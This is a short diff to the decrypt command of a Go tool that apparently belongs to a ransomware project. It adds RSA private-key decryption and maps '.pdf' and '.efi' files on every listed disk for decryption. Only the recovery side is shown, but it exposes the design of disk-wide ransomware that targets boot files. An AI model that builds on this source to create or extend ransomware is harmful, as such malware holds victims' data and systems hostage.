@@ -3,6 +3,7 @@ package cmd
 import (
 	"davidlares/ransomware/decrypt"
 	"davidlares/ransomware/mapper"
+	"davidlares/ransomware/rsa"
 
 	"github.com/spf13/cobra"
 )
@@ -16,9 +17,11 @@ var decryptCmd = &cobra.Command{
 		decryptControl := make(chan struct{}, 10)
 		// disks listing
 		disk := mapper.ListingDisks()
+		// decrypting RSA key
+		rsa.RSADecryptionWithAES("private.pem")
 		// looping
 		for _, disk := range disk {
-			files := mapper.MapFiles(disk, []string{".pdf", ".png"})
+			files := mapper.MapFiles(disk, []string{".pdf", ".efi"})
 			for _, file := range files {
 				// adding to waitgroup
 				mapper.Wg.Add(1)
